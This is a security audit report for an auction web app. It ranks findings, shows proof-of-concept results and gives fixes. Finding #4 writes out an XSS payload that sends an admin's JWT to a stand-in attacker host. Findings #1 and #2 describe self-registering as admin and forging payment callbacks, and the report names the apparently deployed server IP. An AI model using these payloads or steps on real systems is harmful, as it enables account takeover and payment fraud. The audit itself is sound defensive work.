# BidMont Security Audit — 1 August 2026

Scope: `backend/` (all routers, core, services, models), `index.html` (SPA), `Dockerfile`,
`docker-compose.yml`, `backend/scripts/create_admin.sh`, git history. Static review plus two
proof-of-concept exploits run against the app through its own test harness.

Findings 1 and 2 were **confirmed by execution**, not inferred from reading. Everything else is
static analysis; where a finding depends on the deployed environment, that is stated explicitly.

---

## Act on this first

`backend/scripts/create_admin.sh` points at `http://145.223.90.15:8000/`. If that host is
currently reachable, finding #1 means anyone who can send it one HTTP request already has full
admin. Before any code changes:

1. Take the host off the public internet, or block `POST /api/auth/register` at the edge.
2. `SELECT id, email, name, created_at FROM users WHERE role IN ('admin','super_admin','support');`
   — anything you do not personally recognise is an intruder account.
3. Check `audit_logs` and `credit_ledger` for entries you cannot attribute to a known admin.
4. Rotate `JWT_SECRET` (invalidates every existing token, including any an attacker holds),
   `SEED_SECRET`, the Monri keys, the SMTP password, and `POSTGRES_PASSWORD`.
5. Confirm the deployed `ENVIRONMENT` value — see finding #3, which is an unauthenticated account
   takeover of *any* user if it is `development`.

---

## Critical

### 1. Anyone can register themselves as an administrator

`backend/app/schemas/auth.py:9`

```python
role: str = Field(default="buyer", pattern=r"^(buyer|seller|corporate_seller|admin)$")
```

`admin` is in the allowlist of self-selectable registration roles. `register()` passes it straight
into `UserRole(req.role)` and issues a JWT carrying that role. There is no approval step, no
`SEED_SECRET`, no existing-admin check — those guard `POST /admin/seed`, which this bypasses
entirely.

The RBAC layer itself is sound; it is being handed a role the user chose.

**Confirmed by PoC** (registered with `"role": "admin"`, then called admin-only endpoints):

```
PoC1 register -> 201 admin
PoC1 GET /api/admin/users -> 200
PoC1 GET /api/admin/stats -> 200 {"total_users":1,"total_auctions":0,...}
```

Impact: every `get_current_admin` endpoint. Read all user PII, ban users, adjust any account's
credit balance arbitrarily (`POST /api/admin/credits/adjust`), invalidate bids, cancel auctions,
change credit package pricing, read private seller documents, rewrite legal documents. One
unauthenticated HTTP request to complete platform compromise.

Fix: drop `|admin` from the pattern. `super_admin` and `support` were already correctly excluded.
Also add a defence-in-depth check in `register()` so the schema is not the only gate.

### 2. The Monri payment callback is unauthenticated and unsigned

`backend/app/api/credits.py:151-236`

`POST /api/credits/monri/callback` accepts any JSON from any source. It has no `Depends`, no
signature verification, no shared secret, and no source-IP restriction. It trusts the request body
to decide whether a payment succeeded:

```python
target_status = (
    PaymentStatus.completed
    if body.get("status") == "approved" and body.get("response_code") == "0000"
    else PaymentStatus.failed
)
```

The digest function `_monri_digest()` exists at line 31 but is only used to *sign outbound* checkout
forms. Nothing verifies inbound callbacks.

The attack is fully self-service and needs no guessing: call `POST /api/credits/monri/checkout`
normally, read `order_number` out of the `form_fields` in the response, close the payment page
without paying, then POST that order number back to the callback with `status: "approved"`.

One precondition, and it is met: checkout returns 503 and creates no purchase row when
`MONRI_MERCHANT_KEY`/`MONRI_AUTHENTICITY_TOKEN` are unset (`credits.py:96`, before the row is
created at line 116). Both are **set in the repo's `.env`**, so the self-service chain above works
end to end. Confirm the server matches with
`docker compose exec bidmont-app printenv MONRI_MERCHANT_KEY`. Were they empty, the flaw would be
latent rather than gone — guessing `cred-{8 hex}-{unix ts}` is impractical, but the moment Monri is
configured it becomes live.

**Confirmed by PoC:**

```
PoC2 callback -> 200 {"status":"ok"}
PoC2 balance before: {'credits_balance': 0.0} after: {'credits_balance': 500.0}
```

Impact: unlimited free credits, which are the platform's revenue model. Credits buy auction
participation and listings, so this is direct financial loss plus corrupted revenue reporting
(`total_credit_revenue` in admin stats counts these as real income).

The concurrency handling on this endpoint is genuinely good — the conditional `UPDATE` claim at
line 183 is the right pattern. It is guarding an endpoint that has no authentication at all.

Fix: verify the inbound digest Monri sends against `MONRI_MERCHANT_KEY` before touching the
purchase row, and reject the request when it does not match.

### 3. Dev-mode password reset tokens — conditional on deployed `ENVIRONMENT`

`backend/app/api/auth.py:208-212`

```python
if os.getenv("ENVIRONMENT") == "development":
    return {"message": "...", "reset_token": reset_token}
```

When `ENVIRONMENT=development`, `POST /api/auth/forgot-password` returns the raw reset token
**in the HTTP response body** to an unauthenticated caller who supplies only an email address.
Feed it to `POST /api/auth/reset-password` and you own that account — including any admin whose
email address you know or can read from the user list.

The repo's `.env` currently contains `ENVIRONMENT=development`, and `docker-compose.yml:25` reads
`ENVIRONMENT` from that same file (`${ENVIRONMENT:-production}` — the default only applies when the
variable is *absent*, and here it is present and set to `development`). If that `.env` was used to
bring up the production stack, this is live.

There is corroborating evidence that it is. Under `ENVIRONMENT=production`,
`HTTPSRedirectMiddleware` would 307-redirect every plain-HTTP request, including the curl in
`create_admin.sh` — which passes no `-L` and would therefore fail with `HTTP 307` rather than
creating an admin. That script is written against `http://145.223.90.15:8000/` and appears to be in
use, which is only consistent with the deployed value *not* being `production`.

The same flag also exposes email-verification tokens (`auth.py:142`) and disables the
`HTTPSRedirectMiddleware` in `main.py:111`.

Verify on the server: `docker compose exec bidmont-app printenv ENVIRONMENT`. If it says
`development`, treat every account as potentially compromised and rotate `JWT_SECRET`.

Fix: set `ENVIRONMENT=production` in the deployed `.env`. Consider inverting the guard so the
dev-only branch requires an explicit opt-in flag rather than being the default for any non-production
value.

---

## High

### 4. Stored XSS throughout the SPA, with JWTs readable from JavaScript

`index.html` — 86 `innerHTML` assignments, no HTML-escaping helper anywhere in the file.

Server-supplied, user-controlled strings are interpolated directly into HTML. Two representative
sinks:

- `index.html:1331` (admin user table): `<td>${u.name}</td><td>${u.email}</td>`
- `index.html:923` (public auction card): `<h3 style="margin-top:8px">${a.title}</h3>` and
  `<p class="meta">${a.city} · ${a.desc}</p>`
- `index.html:1535` (admin support ticket list): `<td><a ...>${t.subject}</a></td>`, and
  `index.html:1282` renders `${ticket.subject}` into the ticket modal

Line 1535 carries a second, independent injection sink: it embeds `JSON.stringify(t)` — the whole
ticket object, including attacker-supplied `subject` and `message` — inside an inline `onclick`
attribute, escaped by a hand-rolled chain of three `.replace()` calls. Hand-rolled escaping for a
JS-string-inside-an-HTML-attribute context is very hard to get right, and this one does not handle
the HTML layer at all. Note that `POST /api/support/contact` is unauthenticated, so this sink is
reachable by anyone on the internet with no account.

The auth token is in `localStorage` (`index.html:551`), so injected script can read it directly.

Attack: register with a display name of `<img src=x onerror="fetch('//attacker/'+localStorage.bidmont_token)">`.
The admin user table renders it unescaped the moment an admin opens the Users tab, exfiltrating an
admin JWT. Auction title/description reach the same sinks on public pages, hitting every visitor.
Support ticket subject and message render into the admin panel the same way.

Backend validation does not stop this: `RegisterRequest.name` only constrains length, and auction
title/description have no content restrictions.

Fix: one `const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))`
helper, applied at every interpolation of server data. Longer term, move the token to an
`HttpOnly` cookie so XSS cannot read it.

### 5. `get_current_user_optional` ignores account status and never touches the database

`backend/app/core/security.py:136-145`

It decodes the JWT and returns the raw payload. Unlike `get_current_user` (which loads the user and
rejects `status != "active"` at line 128), it performs no database lookup at all.

Two endpoints make authorization decisions from that unverified payload:

- `backend/app/api/uploads.py:271` — private document downloads:
  `is_staff = viewer.get("role") in ("admin","super_admin","support")`
- `backend/app/api/auctions.py:338` — private image visibility on auction detail

So a staff member who is banned or suspended keeps private-document access for the remaining life
of their token (up to 24 hours), and a deleted user's token still resolves. The role also comes from
the token rather than the current database row, so a demoted account retains its old privileges
until expiry.

Fix: make `get_current_user_optional` async, load the user, and apply the same active-status check
as `get_current_user` — returning `None` instead of raising.

### 6. Admin credentials travel as URL query parameters over plaintext HTTP

`backend/app/api/admin.py:66-71` and `backend/scripts/create_admin.sh:32-35`

`POST /api/admin/seed` takes `password` and `secret` as **query parameters**, and the helper script
sends them to `http://145.223.90.15:8000/` — a bare IP over plain HTTP, no TLS.

Query strings are logged by default in web server access logs, proxy logs, and any monitoring in
the path; they persist in shell and browser history. The script is careful to prompt for the
password rather than accept it as an argument, which defeats the purpose when the value then goes
into the URL.

Over plain HTTP, the entire session — this password, every subsequent JWT, every login — is
readable by anyone on the network path.

The stack has no TLS termination anywhere: no reverse proxy in `docker-compose.yml`, and
`HTTPSRedirectMiddleware` is only armed when `ENVIRONMENT=production` (see #3), which would break
the current HTTP setup if it were enabled without a proxy in front.

Fix: move `password` and `secret` to a request body, and put the app behind a TLS-terminating
reverse proxy (Caddy or nginx) before it takes real traffic.

### 7. No token revocation anywhere

`JWT_EXPIRATION_HOURS = 24` (`security.py:27`) with no denylist, no token version column, and no
`iat`-versus-password-change comparison.

Consequently, none of these invalidate an attacker's existing session:

- changing the password (`users.py:60`) or resetting it (`auth.py:218`)
- banning or suspending the account (`admin.py:158`) — for `get_current_user` paths the next request
  is rejected, but see #5 for the paths where it is not
- enabling or disabling 2FA (`admin.py:990`)

A user who discovers their account is compromised has no way to evict the attacker, and neither
does an admin. Rotating `JWT_SECRET` is the only lever, and it logs out everyone.

Fix (minimal): add a `token_epoch` integer to `users`, embed it in the JWT, bump it on password
change/reset/ban, and compare in `get_current_user`.

---

## Medium

### 8. Listing fees bypass the credit ledger and can be double-spent

`backend/app/api/auctions.py:88-91`

```python
if (current_user.credits_balance or 0.0) < listing_fee:
    raise HTTPException(status_code=402, ...)
current_user.credits_balance = (current_user.credits_balance or 0.0) - listing_fee
```

Every other credit movement goes through `apply_ledger_entry()`
(`backend/app/services/credits.py:17`), which is written correctly: it re-reads the user row under
`SELECT ... FOR UPDATE`, computes `balance_before`/`balance_after` from that locked row, refuses to
go negative (402), and appends an immutable `CreditLedger` entry. This path does none of that.

Two consequences. Listing fees are invisible in the ledger, so `credits_balance` no longer
reconciles against `CreditLedger` — defeating the audit trail the ledger design exists to provide.
And because this is the one credit path with no row lock, two concurrent listing creations both read
the same balance and both succeed: a user with 10 credits can post two listings for 10 each.

Fix is small precisely because the correct primitive already exists — call
`apply_ledger_entry(db, current_user, -listing_fee, ...)` and delete the manual arithmetic.


### 9. Upload endpoints: no rate limit, size checked after buffering

`backend/app/api/uploads.py:51-123`

- `POST /api/uploads` with no `auction_id` writes a file to the publicly served `uploads/` directory
  with no database record, no ownership link, and no cleanup path. Any authenticated user can repeat
  this until the disk fills.
- No upload endpoint carries a `@limiter.limit` decorator, unlike auth, bids, and support.
- `MAX_FILE_SIZE` is enforced at line 75, *after* `await file.read()` has already pulled the entire
  body into memory. The 10 MB limit does not bound memory usage; a large upload is buffered in full
  before being rejected.
- Content type comes from the client-supplied `Content-Type` header with no magic-byte check. This
  is largely defused because the stored extension is derived from the server-side allowlist rather
  than the filename, so a `.php`/`.html` file cannot be written — but the file's actual bytes are
  never validated to be an image.

Fix: add a rate limit, stream to disk with a running size check, and drop the no-`auction_id` branch
if nothing uses it.

### 10. Weak password policy and no login backoff

`min_length=6` with no complexity requirement (`schemas/auth.py:8,30`). `POST /api/auth/login` is
limited to 20/minute *per IP*, with no per-account lockout or progressive delay, so a distributed
attempt against a known email is unconstrained. bcrypt hashing is correct and does slow this down.

### 11. A `JWT_SECRET` value appears in git history

Commits `0567bf7` and `447658c` contain `ENV JWT_SECRET="bidmont-production-secret-change-me"` and
`JWT_SECRET=bidmont-dev-secret-change-in-production`. Both read as placeholders and the current
`Dockerfile` correctly carries no secret, so this is probably not a real leak — but anyone with
repo access can read them, and JWT forgery is trivial if either matches production. **Confirm the
deployed value is neither string.** Rotating it is cheap and worth doing regardless.

### 12. TOTP has no replay prevention

`backend/app/core/security.py:66-76`. The implementation is otherwise correct (constant-time
compare via `hmac.compare_digest`, ±1 step drift window), but a code stays valid for its whole
~90-second window and can be replayed. An attacker who observes one code has that window to use it.
2FA is also entirely opt-in for admins — worth making mandatory for `admin`/`super_admin` given
finding #1.

---

## Low / informational

- **Bidder anonymization is enumerable.** `anonymize_bidder()` (`services/auctions.py:29`) is an
  unsalted `sha256(auction_id:user_id)` truncated to 4 digits. Anyone holding a list of user IDs
  (an admin, or an attacker via finding #1) can hash candidates and de-anonymize bid history.
  Adding `JWT_SECRET` or a dedicated salt to the hash input fixes it. The 10,000-bucket space also
  collides on large auctions.
- **CORS default is permissive.** `main.py:115` falls back to `localhost:8000,localhost:3000` with
  `allow_credentials=True` when `CORS_ORIGINS` is unset. Compose requires the variable, so this only
  bites a manual run.
- **Migration DDL is built with f-strings** (`core/migrations.py:116`). Not exploitable — every
  interpolated value is a hardcoded module constant, never user input. Noted so it is not mistaken
  for user-controlled SQL later.
- **Public contact form has no CAPTCHA** (`support.py:29`), rate-limited to 10/min per IP. Spam
  vector, not a security hole.
- **Email failures are silently swallowed** (`services/notifications.py:71`). A user who never
  receives a password reset gets no signal, and neither do you.
- **`finalize_auction_endpoint` checks `role != UserRole.admin`** (`bids.py:376`), which locks out
  `super_admin`. A bug rather than a vulnerability — it fails closed.
- **The `payments` table still carries `stripe_session_id`**, now storing Monri order numbers
  (`credits.py:121`). Harmless but confusing during incident response.

## What is done well

Worth stating, since a findings list reads more alarming than the codebase deserves in these areas:
bcrypt password hashing with per-password salts; reset and email-verification tokens are SHA-256
hashed at rest with expiry; `forgot-password` does not reveal whether an email exists; SQL is
parameterized via SQLAlchemy throughout; upload extensions derive from a server-side MIME allowlist
rather than the filename; private documents are stored outside the publicly mounted directory and
their URLs are rewritten through an authorizing download endpoint; the payment callback's
concurrency claim is race-free; bid placement uses `SELECT ... FOR UPDATE`; `apply_ledger_entry`
locks the user row and writes an append-only ledger entry with correct before/after balances; admin
actions are audit-logged with before/after diffs; and `require_role` defaults to excluding `support`
from financial endpoints rather than needing each one to opt out.

The recurring shape of these findings is worth noting: the hard parts (concurrency, locking,
hashing, token storage, RBAC plumbing) are done well, and the critical issues are all at the trust
boundary — an allowlist with one entry too many, a webhook with no signature check, an environment
flag set to the wrong value. Those are cheap to fix without touching the good machinery underneath.

## Suggested order of work

1. Remove `admin` from the registration role pattern (#1) — one word, stops full compromise.
2. Verify the inbound Monri digest (#2).
3. Set `ENVIRONMENT=production` on the server and confirm it (#3).
4. Add HTML escaping in the SPA (#4).
5. Put TLS in front of the app and move seed credentials out of the query string (#6).
6. Status-check `get_current_user_optional` (#5).
7. Token revocation (#7), then the medium findings.
